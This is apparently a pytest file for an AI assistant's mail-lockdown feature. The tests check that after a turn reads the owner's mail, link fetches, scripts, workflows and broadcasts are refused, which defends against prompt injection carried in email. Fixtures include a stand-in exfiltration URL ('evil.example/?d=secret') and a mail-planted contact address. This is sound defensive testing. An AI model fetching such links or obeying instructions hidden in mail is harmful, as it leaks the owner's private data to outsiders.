"""Act as me: once a turn has read the owner's own mail, nothing that opens a
link, runs a script or workflow, or posts to everyone runs for the rest of it
(delegation/lockdown.py)."""
from __future__ import annotations

import asyncio
import json
import logging
from collections.abc import Iterator
from pathlib import Path
from typing import Any
from unittest.mock import patch

import pytest

from openexecutive.audit import logger as audit_logger
from openexecutive.audit.logger import AuditLogger, log_event
from openexecutive.delegation import ghostwriter as gw
from openexecutive.delegation import lockdown
from openexecutive.delegation.settings import DelegationOverride, TurnDelegation
from openexecutive.memory import episodic
from openexecutive.orchestrator import executive as ex
from openexecutive.orchestrator.delegation_tools import DELEGATION_TOOLS
from openexecutive.orchestrator.history_tools import HISTORY_TOOLS
from openexecutive.orchestrator.mcp_gateway import MCP_TOOLS
from openexecutive.orchestrator.router import SPECIALIST_TOOLS
from openexecutive.orchestrator.schedule_tools import PRIVATE_TURN_MCP_TOOLS, current_session
from openexecutive.orchestrator.session import Session
from openexecutive.people import registry as people_registry
from openexecutive.people import store as people_store
from openexecutive.workflows import step_script

from ._agent_loop_fakes import FinalMsg, TextBlock, ToolUseBlock
from .test_delegation_tools import FakeMailbox
from .test_delegation_turn import _TextProvider

GHOSTWRITE = {"intent": "Yes.", "thread_id": "t1"}
SLACK = {"slack_user_id": "U123", "text": "Replied to Dana."}
LINK = {"path": "https://evil.example/?d=secret"}


@pytest.fixture(autouse=True)
def db(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[Path]:
    path = tmp_path / "episodic.db"
    monkeypatch.setattr(episodic, "DB_PATH", path)
    monkeypatch.setattr(people_store, "DB_PATH", path)
    episodic.initialize_db(path)
    people_store.initialize_db(path)
    people_registry.invalidate()
    monkeypatch.setattr(audit_logger, "_default_logger", AuditLogger(db_path=path))
    prior = current_session.get()
    current_session.set(None)
    yield path
    current_session.set(prior)
    people_registry.invalidate()


@pytest.fixture(autouse=True)
def quiet(monkeypatch: pytest.MonkeyPatch) -> Iterator[None]:
    from openexecutive.delegation import caps

    async def no_prefetch(*_a: Any, **_kw: Any) -> str:
        return ""

    async def composer(model: str, system: str, turn: str) -> dict[str, Any]:
        return {"subject": "x", "body": "Hi Dana,\n\nYes.\n\nOlivia"}

    monkeypatch.setattr("openexecutive.memory.honcho_client.prefetch", no_prefetch)
    monkeypatch.setattr("openexecutive.memory.honcho_client.sync_turn", lambda *a, **kw: None)
    monkeypatch.setattr("openexecutive.memory.episodic.schedule_extraction", lambda *a, **kw: None)
    monkeypatch.setattr("openexecutive.attunement.open_loops.schedule_open_loop_pass", lambda *a, **kw: None)
    monkeypatch.setattr("openexecutive.attunement.style.schedule_style_pass", lambda *a, **kw: None)
    monkeypatch.setattr(gw, "_call_model", composer)
    caps._SAVED_TODAY.clear()
    caps._IN_FLIGHT.clear()
    yield
    caps._SAVED_TODAY.clear()
    caps._IN_FLIGHT.clear()


@pytest.fixture
def sent(monkeypatch: pytest.MonkeyPatch) -> list[dict[str, Any]]:
    """What reached the Slack DM handler (it never runs for real here)."""
    calls: list[dict[str, Any]] = []

    async def handler(tool_input: dict[str, Any]) -> str:
        calls.append(tool_input)
        return json.dumps({"status": "sent"})

    monkeypatch.setitem(ex._ALL_SKILL_HANDLERS, "send_slack_dm", handler)
    return calls


@pytest.fixture
def fetched(monkeypatch: pytest.MonkeyPatch) -> list[dict[str, Any]]:
    """What reached the read_document handler (a link fetch)."""
    calls: list[dict[str, Any]] = []

    async def handler(tool_input: dict[str, Any]) -> str:
        calls.append(tool_input)
        return json.dumps({"text": "page"})

    monkeypatch.setitem(ex._ALL_SKILL_HANDLERS, "read_document", handler)
    return calls


def _turn(*rounds: list[Any], message: str = "reply to Dana as me and Slack Bob") -> tuple[_TextProvider, list[Any]]:
    principal = people_store.upsert_person(full_name="Olivia Owner", is_principal=True, email="olivia@co.example")
    people_registry.invalidate()
    person = people_store.get_person(principal)
    session = Session(
        delegation_override=DelegationOverride(enabled=True, gmail=FakeMailbox(), person=person),
        from_web_chat=True,
    )
    finals = [FinalMsg(uses, "tool_use") for uses in rounds]
    finals.append(FinalMsg([TextBlock("Done.")], "end_turn"))
    provider = _TextProvider(finals)

    async def go() -> None:
        with (
            patch("openexecutive.orchestrator.executive.get_provider", return_value=provider),
            patch("openexecutive.orchestrator.executive.audit_log", log_event),
        ):
            async for _ in ex.Executive().stream_chat(message, session, person_id=principal):
                pass

    asyncio.run(go())
    return provider, provider.calls


def _tool_results(call: dict[str, Any]) -> dict[str, str]:
    """The tool_result contents the model was sent back in ``call``."""
    last = call["messages"][-1]
    return {
        block["tool_use_id"]: block["content"]
        for block in last["content"]
        if isinstance(block, dict) and block.get("type") == "tool_result"
    }


def test_every_tool_is_classified_once() -> None:
    names = {
        t["name"]
        for t in [
            *ex._ALL_SKILL_TOOLS, *SPECIALIST_TOOLS, *MCP_TOOLS, *DELEGATION_TOOLS, *HISTORY_TOOLS,
            step_script.CHAT_TOOL_DEFINITION, step_script.LIST_SAVED_TOOLS_DEFINITION,
        ]
    }
    allowed, withheld = lockdown.MAIL_TOUCHED_ALLOWED_TOOLS, lockdown.MAIL_TOUCHED_WITHHELD_TOOLS
    assert not allowed & withheld
    # A new tool fails here until someone decides which side it is on.
    assert names - (allowed | withheld) == set()
    assert (allowed | withheld) - names == set()


def test_call_tool_runs_only_reads_and_recipient_checked_sends() -> None:
    for name in ("google_workspace__get_events", "google_workspace__send_gmail_message", "microsoft_365__send-mail"):
        assert name in PRIVATE_TURN_MCP_TOOLS
        assert not lockdown.mail_touched_withholds("call_tool", {"name": name})
    assert lockdown.mail_touched_withholds("call_tool", {"name": "fetch__fetch_url"})
    assert lockdown.mail_touched_withholds("call_tool", "not a dict")
    assert lockdown.mail_touched_withholds("some_future_tool", {})  # unclassified: withheld
    assert not lockdown.mail_touched_withholds("ghostwrite_email", {})


def test_only_links_scripts_workflows_posts_and_lasting_text_are_withheld() -> None:
    assert {
        "read_document", "load_mcp_server", "add_watchlist_entry", "tune_watchlist_entry",
        "run_executive_research", "run_script", "run_python_job",
        "suggest_workflow", "run_workflow", "save_workflow",
        "send_department_message", "send_company_broadcast", "create_alert",
        "archive_person", "set_department_head", "resolve_roster_request",
        "schedule_followup", "create_goal", "update_department_goal",
        "record_decision_outcome",
    } == lockdown.MAIL_TOUCHED_WITHHELD_TOOLS
    for tool in ("message_person", "send_slack_dm", "create_calendar_event",
                 "remember_fact", "remind_me", "update_company_profile"):
        assert not lockdown.mail_touched_withholds(tool, {}), tool


def test_a_send_after_the_turn_read_mail_runs(sent: list[dict[str, Any]]) -> None:
    # Messages reach only people on the roster, checked in their own path.
    _turn(
        [ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)],
        [ToolUseBlock("tu2", "send_slack_dm", SLACK)],
    )
    assert sent == [SLACK]


def test_a_link_after_the_turn_read_mail_is_refused(fetched: list[dict[str, Any]]) -> None:
    _, calls = _turn(
        [ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)],
        [ToolUseBlock("tu2", "read_document", LINK)],
    )
    assert fetched == []
    refusal = json.loads(_tool_results(calls[2])["tu2"])["error"]
    assert "read the user's own mail" in refusal and "next message" in refusal
    rows = [r for r in audit_logger._default_logger.query(event_type="tool_invocation", limit=50)
            if (r.details or {}).get("refused") == "mail_touched"]
    assert len(rows) == 1 and rows[0].private


def test_a_link_in_the_same_round_is_refused_too(fetched: list[dict[str, Any]]) -> None:
    # A round's tools run together, so the draft's round counts as touched.
    _, calls = _turn([
        ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE),
        ToolUseBlock("tu2", "read_document", LINK),
    ])
    assert fetched == []
    results = _tool_results(calls[1])
    assert json.loads(results["tu1"])["status"] == "drafted"
    assert "read the user's own mail" in json.loads(results["tu2"])["error"]


def test_a_link_beside_a_notes_recall_is_refused(fetched: list[dict[str, Any]]) -> None:
    # Reading the speaker's own notes locks the turn the same way, from the
    # round that asks for them.
    _turn([
        ToolUseBlock("tu1", "recall_history", {}),
        ToolUseBlock("tu2", "read_document", LINK),
    ])
    assert fetched == []


def test_a_turn_that_read_no_mail_still_sends(sent: list[dict[str, Any]]) -> None:
    _turn([ToolUseBlock("tu2", "send_slack_dm", SLACK)])
    assert sent == [SLACK]


@pytest.fixture
def kept_private(monkeypatch: pytest.MonkeyPatch) -> list[Any]:
    """Every session reads as one that read its owner's mail before
    (``sessions.mail_private``); the pins each turn made, to inspect."""
    from openexecutive.delegation import settings as dsettings
    from openexecutive.memory import session_store

    def owner(_sid: str, *_a: Any, **_k: Any) -> tuple[bool, int | None]:
        principal = people_store.find_principal_person()
        return True, principal.id if principal else None

    monkeypatch.setattr(session_store, "session_mail_private", lambda *_a, **_k: True)
    monkeypatch.setattr(session_store, "get_session_owner", owner)
    pins: list[Any] = []
    real = dsettings.pin_turn_delegation

    def pin(session: Any, speaker_text: str) -> Any:
        # A fake mailbox's turn skips the conversation's flag; apply it as a
        # real turn in that conversation would.
        pinned = real(session, speaker_text)
        dsettings._carry_kept_private(pinned)
        pins.append(pinned)
        return pinned

    monkeypatch.setattr(dsettings, "pin_turn_delegation", pin)
    monkeypatch.setattr(ex, "pin_turn_delegation", pin, raising=False)
    return pins


def test_a_later_turn_runs_links_and_sends(
    fetched: list[dict[str, Any]], sent: list[dict[str, Any]], kept_private: list[Any]
) -> None:
    # Only the reading turn is locked: the next message is the person asking
    # again, having read the reply. It stays private to them.
    _turn([
        ToolUseBlock("tu1", "read_document", LINK),
        ToolUseBlock("tu2", "send_slack_dm", SLACK),
    ])
    assert fetched == [LINK] and sent == [SLACK]
    assert kept_private and kept_private[-1].touched_mail is True
    assert kept_private[-1].read_mail is False


def test_reading_mail_in_that_later_turn_locks_it_again(
    fetched: list[dict[str, Any]], kept_private: list[Any]
) -> None:
    _turn(
        [ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)],
        [ToolUseBlock("tu2", "read_document", LINK)],
    )
    assert fetched == []
    assert kept_private[-1].read_mail is True


def test_the_offered_tools_never_change_mid_turn(sent: list[dict[str, Any]]) -> None:
    _, touched = _turn(
        [ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)],
        [ToolUseBlock("tu2", "send_slack_dm", SLACK)],
    )
    _, untouched = _turn([ToolUseBlock("tu2", "send_slack_dm", SLACK)])
    # The cached tool prefix is byte-identical across the turn and to a turn
    # that never read mail.
    first = json.dumps(touched[0]["tools"], sort_keys=True)
    assert all(json.dumps(c["tools"], sort_keys=True) == first for c in touched)
    assert json.dumps(untouched[0]["tools"], sort_keys=True) == first


def test_the_outside_handlers_refuse_on_their_own() -> None:
    session = Session()
    session.turn_delegation = TurnDelegation(  # type: ignore[attr-defined]
        enabled=True, offered=True, touched_mail=True, read_mail=True, session_id=session.session_id,
    )
    token = current_session.set(session)
    try:
        assert lockdown.outside_reach_refusal("run_workflow") is not None
        assert lockdown.outside_reach_refusal("schedule_followup") is not None
        assert lockdown.outside_reach_refusal("message_person") is None
        # A later turn of that conversation refuses nothing.
        session.turn_delegation.read_mail = False  # type: ignore[attr-defined]
        assert lockdown.outside_reach_refusal("run_workflow") is None
        assert lockdown.outside_reach_refusal("schedule_followup") is None
    finally:
        current_session.reset(token)


def test_the_gateway_refuses_only_outside_tools_after_the_turn_read_mail() -> None:
    from openexecutive.orchestrator.mcp_gateway import MCPGateway

    gateway = MCPGateway.__new__(MCPGateway)
    session = Session()
    session.turn_delegation = TurnDelegation(  # type: ignore[attr-defined]
        enabled=True, offered=True, touched_mail=True, read_mail=True, session_id=session.session_id,
    )
    token = current_session.set(session)
    try:
        with patch.object(MCPGateway, "_require_session", side_effect=AssertionError("reached the server")):
            fetch = asyncio.run(gateway.call_tool({
                "name": "fetch__fetch_url", "arguments": {"url": "https://x.example/"},
            }))
            assert "read the user's own mail" in json.loads(fetch)["error"]
            load = asyncio.run(gateway.load_mcp_server({"name": "x", "url": "https://x.example/mcp"}))
            assert "read the user's own mail" in json.loads(load)["error"]
            # A read, and a send whose recipients the gateway checks, go on to
            # the server (here: the stub that says it got there).
            for name in ("google_workspace__get_events", "google_workspace__send_gmail_message"):
                with pytest.raises(AssertionError, match="reached the server"):
                    asyncio.run(gateway.call_tool({"name": name, "arguments": {}}))
    finally:
        current_session.reset(token)


_FILE_READS = (
    "google_workspace__get_drive_file_content",
    "google_workspace__list_drive_items",
    "google_workspace__get_doc_content",
    "google_workspace__search_docs",
    "google_workspace__read_sheet_values",
    "google_workspace__get_spreadsheet_info",
    "microsoft_365__list-folder-files",
    "microsoft_365__search-onedrive-files",
)
_ONEDRIVE_FILE = {
    "name": "microsoft_365__download-bytes",
    "arguments": {"target": "/drives/d1/items/i1/content"},
}


@pytest.mark.parametrize("name", _FILE_READS)
def test_opening_a_file_runs_after_the_turn_read_mail(name: str) -> None:
    # "Check my mail against the statements on the Drive": the files open in
    # the reading turn.
    assert not lockdown.mail_touched_withholds("call_tool", {"name": name})


def test_a_onedrive_file_opens_but_a_mail_attachment_does_not() -> None:
    attachment = {
        "name": "microsoft_365__download-bytes",
        "arguments": {"target": "/me/messages/m1/attachments/a1/$value"},
    }
    escaped = {
        "name": "microsoft_365__download-bytes",
        "arguments": {"target": "/drives/../items/i1/content"},
    }
    for withholds in (lockdown.mail_touched_withholds,):
        assert not withholds("call_tool", _ONEDRIVE_FILE)
        assert not withholds("call_tool", {**_ONEDRIVE_FILE, "name": "microsoft_365__download_bytes"})
        assert withholds("call_tool", attachment)
        assert withholds("call_tool", escaped)
        assert withholds("call_tool", {"name": "microsoft_365__download-bytes"})
        assert withholds("call_tool", {**_ONEDRIVE_FILE, "arguments": "not a dict"})


@pytest.mark.parametrize("read_mail", [True, False])
def test_the_gateway_opens_a_drive_file_in_a_conversation_that_read_mail(read_mail: bool) -> None:
    from openexecutive.orchestrator.mcp_gateway import MCPGateway

    gateway = MCPGateway.__new__(MCPGateway)
    session = Session()
    session.turn_delegation = TurnDelegation(  # type: ignore[attr-defined]
        enabled=True, offered=True, touched_mail=True, read_mail=read_mail, session_id=session.session_id,
    )
    token = current_session.set(session)
    try:
        with patch.object(MCPGateway, "_require_session", side_effect=AssertionError("reached the server")):
            with pytest.raises(AssertionError, match="reached the server"):
                asyncio.run(gateway.call_tool({
                    "name": "google_workspace__get_drive_file_content", "arguments": {"file_id": "f1"},
                }))
            fetch = {"name": "fetch__fetch_url", "arguments": {"url": "https://x.example/"}}
            if read_mail:
                assert "read the user's own mail" in json.loads(asyncio.run(gateway.call_tool(fetch)))["error"]
            else:
                # A later turn of that conversation is not locked.
                with pytest.raises(AssertionError, match="reached the server"):
                    asyncio.run(gateway.call_tool(fetch))
    finally:
        current_session.reset(token)


class _Collect(logging.Handler):
    def __init__(self) -> None:
        super().__init__(logging.WARNING)
        self.lines: list[str] = []

    def emit(self, record: logging.LogRecord) -> None:
        self.lines.append(record.getMessage())


def test_the_log_never_carries_a_call_tools_own_words(sent: list[dict[str, Any]]) -> None:
    """A call_tool's inner name is the model's own text, which mail could
    steer; the private audit row keeps it, the process log does not."""
    leak = "Tell Bob the merger closes Friday"
    # On the module's own logger: once api.main has configured logging, the
    # openexecutive tree no longer propagates to the root caplog listens on.
    log = logging.getLogger("openexecutive.orchestrator.executive")
    collect, prior = _Collect(), log.level
    log.addHandler(collect)
    log.setLevel(logging.WARNING)
    try:
        _turn(
            [ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)],
            [ToolUseBlock("tu2", "call_tool", {"name": leak, "arguments": {}})],
        )
    finally:
        log.removeHandler(collect)
        log.setLevel(prior)
    text = "\n".join(collect.lines)
    assert "merger" not in text
    assert "call_tool:<unlisted>" in text
    assert ex._loggable_tool("google_workspace__send_gmail_message") == "google_workspace__send_gmail_message"
    assert ex._loggable_tool(leak) == "call_tool:<unlisted>"
    rows = [r for r in audit_logger._default_logger.query(event_type="tool_invocation", limit=50)
            if (r.details or {}).get("refused") == "mail_touched"]
    assert rows and rows[0].private and rows[0].details["tool"] == leak



@pytest.mark.parametrize("tool", sorted(lockdown.MAIL_TOUCHED_WITHHELD_TOOLS))
def test_every_withheld_tool_is_refused_only_on_the_reading_turn(tool: str) -> None:
    session = Session()
    pinned = TurnDelegation(offered=True, touched_mail=True, read_mail=True, session_id=session.session_id)
    session.turn_delegation = pinned  # type: ignore[attr-defined]
    token = current_session.set(session)
    try:
        assert lockdown.mail_touched_withholds(tool, {})
        assert "next message" in (lockdown.outside_reach_refusal(tool) or "")
        pinned.read_mail = False
        assert lockdown.outside_reach_refusal(tool) is None
    finally:
        current_session.reset(token)


@pytest.mark.parametrize(("handler", "tool"), [
    ("openexecutive.orchestrator.schedule_tools:handle_suggest_workflow", "suggest_workflow"),
    ("openexecutive.orchestrator.workflow_run_tools:handle_run_workflow", "run_workflow"),
    ("openexecutive.orchestrator.workflow_authoring_tools:handle_save_workflow", "save_workflow"),
    ("openexecutive.orchestrator.document_tools:handle_read_document", "read_document"),
    ("openexecutive.orchestrator.watchlist_tools:handle_add_watchlist_entry", "add_watchlist_entry"),
    ("openexecutive.orchestrator.watchlist_tools:handle_tune_watchlist_entry", "tune_watchlist_entry"),
    ("openexecutive.orchestrator.research_tools:handle_run_executive_research", "run_executive_research"),
    ("openexecutive.orchestrator.broadcast_tools:handle_send_department_message", "send_department_message"),
    ("openexecutive.orchestrator.broadcast_tools:handle_send_company_broadcast", "send_company_broadcast"),
])
def test_link_workflow_and_broadcast_handlers_refuse_on_their_own(handler: str, tool: str) -> None:
    import importlib

    module, name = handler.split(":")
    fn = getattr(importlib.import_module(module), name)
    session = Session()
    token = current_session.set(session)
    try:
        session.turn_delegation = TurnDelegation(  # type: ignore[attr-defined]
            offered=True, touched_mail=True, read_mail=True, session_id=session.session_id,
        )
        result = json.loads(asyncio.run(fn({})))
        assert "next message" in result["error"] and tool in result["error"]
    finally:
        current_session.reset(token)


@pytest.mark.parametrize("reads_mail", [False, True])
def test_a_contact_the_speaker_names_is_added_after_reading_mail(
    monkeypatch: pytest.MonkeyPatch, reads_mail: bool
) -> None:
    # "Add Jamie as a contact" is the person's own ask, checked against what
    # they typed; a contact only the mail named is not added, and nor is an
    # address no mail read this turn was sent from.
    added: list[dict[str, Any]] = []

    async def upsert(tool_input: dict[str, Any]) -> str:
        added.append(tool_input)
        return json.dumps({"status": "created"})

    monkeypatch.setitem(ex._ALL_SKILL_HANDLERS, "upsert_person", upsert)
    jamie = {"full_name": "Jamie Rivera", "kind": "contact", "email": "jamie@firm.example"}
    stranger = {"full_name": "Morgan Blake", "kind": "contact", "email": "m@evil.example"}
    planted = {"full_name": "Jamie Rivera", "kind": "contact", "email": "jamie@evil.example"}
    adds = [
        ToolUseBlock("tu2", "upsert_person", jamie),
        ToolUseBlock("tu3", "upsert_person", stranger),
        ToolUseBlock("tu4", "upsert_person", planted),
    ]
    rounds = [[ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)], adds] if reads_mail else [adds]
    _turn(*rounds, message="Can you add jamie as a contact? jamie@firm.example")
    assert added == ([jamie] if reads_mail else [jamie, stranger, planted])
